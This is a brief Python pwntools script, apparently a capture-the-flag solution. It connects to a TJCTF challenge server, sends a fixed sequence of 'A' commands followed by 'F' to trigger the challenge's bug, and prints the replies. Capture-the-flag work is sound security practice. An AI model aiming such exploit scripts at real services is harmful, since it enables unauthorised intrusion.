from pwn import *

context.log_level = 'critical'

s = remote('problem1.tjctf.org', 8002)

print s.recv()

for i in range(8):
    s.sendline('A anithing')

s.sendline('A amaa')

s.sendline('F')

print s.recv()
print s.recv()
print s.recv()

s.close()
